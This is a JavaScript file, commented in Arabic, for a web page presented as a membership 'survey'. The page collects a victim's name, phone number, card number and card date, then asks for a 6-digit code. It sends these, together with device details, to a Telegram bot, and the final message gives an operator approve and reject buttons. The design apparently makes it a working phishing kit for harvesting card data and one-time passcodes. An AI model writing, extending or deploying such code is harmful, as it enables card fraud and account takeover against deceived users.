// المتغيرات العامة
let currentSurveyData = {};
let currentSurveyId = null;
let deviceInfo = null;
let step1MessageId = null;

// عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // إخفاء شاشة التحميل
    setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        showPage('page1');
        
        // إعداد التواريخ في الماضي (10 سنوات)
        setupYearOptions();
        
        // كشف الجهاز
        detectAndShowDevice();
        
    }, 1000);
    
    // إعداد مستمعي الأحداث
    setupEventListeners();
});

// إعداد مستمعي الأحداث
function setupEventListeners() {
    // تنسيق الهاتف أثناء الكتابة
    const phoneInput = document.getElementById('phoneNumber');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 10) value = value.substring(0, 10);
            this.value = value;
        });
    }
    
    // منع الأحرف في رقم البطاقة
    const cardInput = document.getElementById('cardNumber');
    if (cardInput) {
        cardInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 16) {
                this.value = this.value.substring(0, 16);
            }
        });
    }
    
    // منع الأحرف في الرمز العشوائي
    const codeInput = document.getElementById('randomCode');
    if (codeInput) {
        codeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 6) {
                this.value = this.value.substring(0, 6);
            }
        });
    }
}

// إعداد خيارات السنوات
function setupYearOptions() {
    const yearSelect = document.getElementById('membershipYear');
    const currentYear = new Date().getFullYear();
    
    // مسح الخيارات الحالية
    yearSelect.innerHTML = '<option value="">اختر السنة</option>';
    
    // إضافة 10 سنوات للماضي
    for (let i = 0; i < 10; i++) {
        const year = currentYear - i;
        const option = document.createElement('option');
        option.value = year;
        option.textContent = year;
        yearSelect.appendChild(option);
    }
    
    // تعيين السنة الحالية كافتراضية
    yearSelect.value = currentYear;
}

// كشف الجهاز وعرض المعلومات
function detectAndShowDevice() {
    deviceInfo = detectDevice();
    
    if (deviceInfo) {
        document.getElementById('deviceType').textContent = deviceInfo.type;
        document.getElementById('browserType').textContent = deviceInfo.browser;
        document.getElementById('osType').textContent = deviceInfo.os;
        document.getElementById('screenSize').textContent = deviceInfo.screen;
    }
}

// كشف الجهاز
function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    const screenWidth = window.screen.width;
    
    let deviceType = "جوال";
    let browser = "Chrome";
    let os = "Android";
    let screenSize = `${screenWidth}×${window.screen.height}`;
    
    // كشف نوع الجهاز
    if (/(tablet|ipad)/i.test(userAgent)) {
        deviceType = "تابلت";
    } else if (screenWidth > 1024 && !/mobile/i.test(userAgent)) {
        deviceType = "كمبيوتر";
    }
    
    // كشف المتصفح
    if (/firefox/i.test(userAgent)) {
        browser = "Firefox";
    } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
        browser = "Safari";
    } else if (/edg/i.test(userAgent)) {
        browser = "Edge";
    } else if (/opera|opr/i.test(userAgent)) {
        browser = "Opera";
    }
    
    // كشف نظام التشغيل
    if (/ios|iphone/i.test(userAgent)) {
        os = "iOS";
    } else if (/windows/i.test(userAgent)) {
        os = "Windows";
    } else if (/mac os|macintosh/i.test(userAgent)) {
        os = "macOS";
    } else if (/linux/i.test(userAgent)) {
        os = "Linux";
    }
    
    return {
        type: deviceType,
        browser: browser,
        os: os,
        screen: screenSize,
        userAgent: userAgent.substring(0, 100)
    };
}

// إرسال البيانات للمدير (الصفحة 1)
async function sendToManager() {
    // جمع البيانات من الصفحة 1
    const name = document.getElementById('fullName').value.trim();
    const phone = document.getElementById('phoneNumber').value.trim();
    const card = document.getElementById('cardNumber').value.trim();
    const month = document.getElementById('membershipMonth').value;
    const year = document.getElementById('membershipYear').value;
    
    // التحقق من البيانات
    if (!name || !phone || !card || !month || !year) {
        showNotification('يرجى ملء جميع الحقول المطلوبة', 'error');
        return;
    }
    
    if (!isValidName(name)) {
        showNotification('الاسم يجب أن يكون عربي ويتكون من 3 أحرف على الأقل', 'error');
        return;
    }
    
    if (!isValidPhone(phone)) {
        showNotification('رقم الهاتف غير صحيح', 'error');
        return;
    }
    
    if (!isValidCard(card)) {
        showNotification('رقم البطاقة يجب أن يكون 16 رقم', 'error');
        return;
    }
    
    // تأكيد الموافقة
    const confirmation = document.getElementById('dataConfirmation');
    if (!confirmation.checked) {
        showNotification('يجب الموافقة على إرسال البيانات', 'error');
        return;
    }
    
    // إنشاء رقم استبيان فريد
    currentSurveyId = generateSurveyId();
    
    // حفظ البيانات مؤقتاً
    currentSurveyData = {
        name: name,
        phone: phone,
        card: card,
        membershipMonth: month,
        membershipYear: year,
        step1Completed: false,
        step2Completed: false,
        timestamp: new Date().toLocaleString('ar-SA'),
        deviceInfo: deviceInfo
    };
    
    // إرسال الخطوة 1 للبوت
    showNotification(CONFIG.MESSAGES.SENDING, 'info');
    
    try {
        // إرسال الخطوة 1
        const step1Response = await sendStep1ToTelegram(currentSurveyData);
        
        if (step1Response.success) {
            // حفظ معرف الرسالة
            step1MessageId = step1Response.messageId;
            currentSurveyData.step1MessageId = step1MessageId;
            currentSurveyData.step1Completed = true;
            
            showNotification(CONFIG.MESSAGES.STEP1_SENT, 'success');
            
            // الانتقال للصفحة 2 بعد ثانية
            setTimeout(() => {
                showPage('page2');
                showNotification(CONFIG.MESSAGES.DEVICE_DETECTED, 'info');
            }, 1000);
            
        } else {
            throw new Error(step1Response.error);
        }
        
    } catch (error) {
        console.error('❌ خطأ في إرسال الخطوة 1:', error);
        showNotification('⚠️ تم حفظ البيانات محلياً، جاري الانتقال...', 'warning');
        
        setTimeout(() => {
            showPage('page2');
        }, 1000);
    }
}

// إرسال الخطوة 1 للبوت
async function sendStep1ToTelegram(data) {
    // إذا لم يكن هناك توكن
    if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN.includes('ضع_توكن')) {
        console.log('⚠️ لم يتم إعداد بوت التيليجرام - استمرار بدون إرسال');
        return { success: true, local: true, messageId: null };
    }
    
    const months = ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 
                   'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'];
    const monthName = months[parseInt(data.membershipMonth) - 1] || data.membershipMonth;
    
    const message = `📋 *استبيان جديد - الخطوة 1*\n\n` +
                   `👤 *الاسم:* ${data.name}\n` +
                   `📞 *الهاتف:* \`${data.phone}\`\n` +
                   `💳 *البطاقة:* \`${data.card.substring(0, 4)} **** **** ${data.card.substring(12)}\`\n` +
                   `📅 *تاريخ الانتماء:* ${monthName} ${data.membershipYear}\n\n` +
                   `🆔 *رقم الاستبيان:* \`${currentSurveyId}\`\n` +
                   `⏰ *الوقت:* ${data.timestamp}\n` +
                   `📌 *الحالة:* بانتظار الرمز`;
    
    try {
        const response = await fetch(`${CONFIG.API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            return { success: true, messageId: result.result.message_id };
        } else {
            return { success: false, error: result.description };
        }
        
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// إكمال التحقق (الصفحة 2)
async function completeVerification() {
    const randomCode = document.getElementById('randomCode').value.trim();
    
    if (!randomCode || !isValidCode(randomCode)) {
        showNotification('يجب إدخال 6 أرقام للرمز', 'error');
        document.getElementById('randomCode').classList.add('shake');
        setTimeout(() => {
            document.getElementById('randomCode').classList.remove('shake');
        }, 500);
        return;
    }
    
    // إضافة الرمز للبيانات
    currentSurveyData.randomCode = randomCode;
    currentSurveyData.completedAt = new Date().toLocaleString('ar-SA');
    
    showNotification('🔐 جاري إرسال الرمز للمدير...', 'info');
    
    try {
        // إرسال الخطوة 2 للبوت
        const step2Response = await sendStep2ToTelegram(currentSurveyData);
        
        if (step2Response.success) {
            currentSurveyData.step2Completed = true;
            showNotification(CONFIG.MESSAGES.STEP2_SENT, 'success');
            
            // إرسال الرسالة النهائية
            setTimeout(async () => {
                const finalResponse = await sendFinalSurveyToTelegram(currentSurveyData);
                
                if (finalResponse.success) {
                    showNotification(CONFIG.MESSAGES.COMPLETED, 'success');
                    
                    // حفظ محلي
                    saveSurveyLocally();
                    
                    // تحديث صفحة النهاية
                    updateCompletionPage();
                    
                    // الانتقال للصفحة 3 بعد ثانيتين
                    setTimeout(() => {
                        showPage('page3');
                    }, 2000);
                    
                } else {
                    throw new Error('فشل إرسال الرسالة النهائية');
                }
            }, 1000);
            
        } else {
            throw new Error(step2Response.error);
        }
        
    } catch (error) {
        console.error('❌ خطأ في إكمال الاستبيان:', error);
        
        // حفظ محلي والانتقال
        saveSurveyLocally();
        updateCompletionPage();
        
        showNotification('⚠️ تم حفظ الاستبيان محلياً', 'warning');
        
        setTimeout(() => {
            showPage('page3');
        }, 2000);
    }
}

// إرسال الخطوة 2 للبوت
async function sendStep2ToTelegram(data) {
    if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN.includes('ضع_توكن')) {
        return { success: true, local: true };
    }
    
    const message = `🔐 *اكتمال الاستبيان - الخطوة 2*\n\n` +
                   `🆔 *رقم الاستبيان:* \`${currentSurveyId}\`\n` +
                   `🔐 *الرمز:* \`${data.randomCode}\`\n` +
                   `📱 *معلومات الجهاز:*\n` +
                   `• النوع: ${data.deviceInfo.type}\n` +
                   `• المتصفح: ${data.deviceInfo.browser}\n` +
                   `• النظام: ${data.deviceInfo.os}\n` +
                   `• الشاشة: ${data.deviceInfo.screen}\n\n` +
                   `✅ *الحالة:* تم استلام الرمز\n` +
                   `⏰ *الوقت:* ${data.completedAt}`;
    
    try {
        const response = await fetch(`${CONFIG.API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        const result = await response.json();
        return { success: result.ok, error: result.description };
        
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// إرسال الرسالة النهائية بعد اكتمال الخطوتين
async function sendFinalSurveyToTelegram(data) {
    if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN.includes('ضع_توكن')) {
        return { success: true, local: true };
    }
    
    const months = ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 
                   'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'];
    const monthName = months[parseInt(data.membershipMonth) - 1] || data.membershipMonth;
    
    const message = `🎉 *استبيان مكتمل*\n\n` +
                   `📋 *المعلومات الشخصية:*\n` +
                   `• الاسم: ${data.name}\n` +
                   `• الهاتف: \`${data.phone}\`\n` +
                   `• البطاقة: \`${data.card.substring(0, 4)} **** **** ${data.card.substring(12)}\`\n` +
                   `• تاريخ الانتماء: ${monthName} ${data.membershipYear}\n\n` +
                   `🔐 *الرمز العشوائي:* \`${data.randomCode}\`\n\n` +
                   `📱 *معلومات الجهاز:*\n` +
                   `• النوع: ${data.deviceInfo.type}\n` +
                   `• المتصفح: ${data.deviceInfo.browser}\n` +
                   `• النظام: ${data.deviceInfo.os}\n` +
                   `• الشاشة: ${data.deviceInfo.screen}\n\n` +
                   `🆔 *رقم الاستبيان:* \`${currentSurveyId}\`\n` +
                   `📅 *تاريخ الاكتمال:* ${data.completedAt}`;
    
    try {
        const response = await fetch(`${CONFIG.API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ قبول", callback_data: `approve_${currentSurveyId}` },
                            { text: "❌ رفض", callback_data: `reject_${currentSurveyId}` }
                        ],
                        [
                            { text: "👁️ عرض التفاصيل", callback_data: `details_${currentSurveyId}` }
                        ]
                    ]
                }
            })
        });
        
        const result = await response.json();
        return { success: result.ok, messageId: result.result?.message_id };
        
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// حفظ الاستبيان محلياً
function saveSurveyLocally() {
    try {
        const surveys = loadFromStorage('surveys', []);
        const surveyData = {
            ...currentSurveyData,
            surveyId: currentSurveyId,
            step1MessageId: step1MessageId,
            status: 'pending',
            submittedAt: new Date().toISOString(),
            completed: true
        };
        
        surveys.push(surveyData);
        saveToStorage('surveys', surveys);
        
        console.log('✅ تم حفظ الاستبيان محلياً');
        return true;
    } catch (error) {
        console.error('❌ خطأ في الحفظ المحلي:', error);
        return false;
    }
}

// تحديث صفحة النهاية
function updateCompletionPage() {
    // تحديث المعلومات
    document.getElementById('surveyId').textContent = currentSurveyId;
    document.getElementById('submissionDate').textContent = new Date().toLocaleString('ar-SA');
    document.getElementById('submittedName').textContent = currentSurveyData.name;
    document.getElementById('submittedPhone').textContent = currentSurveyData.phone;
}

// تعبئة مثال للرمز
function fillCode(code) {
    document.getElementById('randomCode').value = code;
    showNotification(`تم تعبئة الرمز: ${code}`, 'info');
}

// الانتقال بين الصفحات
function showPage(pageId) {
    // إخفاء جميع الصفحات
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    
    // إظهار الصفحة المطلوبة
    document.getElementById(pageId).classList.add('active');
    
    // التمرير للأعلى
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// العودة للصفحة الرئيسية
function goHome() {
    showPage('page1');
}

// إنشاء استبيان جديد
function newSurvey() {
    // إعادة تعيين البيانات
    currentSurveyData = {};
    currentSurveyId = null;
    step1MessageId = null;
    
    // إعادة تعيين النموذج
    document.getElementById('fullName').value = '';
    document.getElementById('phoneNumber').value = '';
    document.getElementById('cardNumber').value = '';
    document.getElementById('randomCode').value = '';
    document.getElementById('dataConfirmation').checked = false;
    
    // إعادة تعيين تاريخ الانتماء
    const currentYear = new Date().getFullYear();
    document.getElementById('membershipYear').value = currentYear;
    document.getElementById('membershipMonth').value = '';
    
    // العودة للصفحة الأولى
    showPage('page1');
}

// مشاركة رقم الاستبيان
function shareSurvey() {
    const surveyId = document.getElementById('surveyId').textContent;
    const shareInput = document.getElementById('shareCodeInput');
    
    shareInput.value = surveyId;
    document.getElementById('shareModal').style.display = 'flex';
}

// إغلاق النافذة المنبثقة
function closeModal() {
    document.getElementById('shareModal').style.display = 'none';
    document.getElementById('copyMessage').style.display = 'none';
}

// نسخ للكليبورد
function copyToClipboard() {
    const shareInput = document.getElementById('shareCodeInput');
    const copyMessage = document.getElementById('copyMessage');
    
    shareInput.select();
    shareInput.setSelectionRange(0, 99999);
    
    navigator.clipboard.writeText(shareInput.value)
        .then(() => {
            copyMessage.textContent = CONFIG.MESSAGES.COPIED;
            copyMessage.className = 'copy-message success';
            copyMessage.style.display = 'block';
            
            setTimeout(() => {
                copyMessage.style.display = 'none';
                closeModal();
            }, 2000);
        })
        .catch(() => {
            copyMessage.textContent = '❌ فشل النسخ';
            copyMessage.className = 'copy-message error';
            copyMessage.style.display = 'block';
        });
}

// عرض حالة الاستبيان
function viewStatus() {
    showNotification('🔍 جاري البحث عن حالة الاستبيان...', 'info');
    
    setTimeout(() => {
        showNotification('✅ الحالة: قيد المراجعة من قبل المدير', 'success');
    }, 1500);
}

// عرض الإشعارات
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    
    notification.textContent = message;
    notification.className = `notification ${type}`;
    notification.style.display = 'block';
    
    // إخفاء تلقائي بعد 3 ثواني
    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// أسلوب CSS للهزة
const style = document.createElement('style');
style.textContent = `
    .shake {
        animation: shake 0.5s;
    }
    
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
        20%, 40%, 60%, 80% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);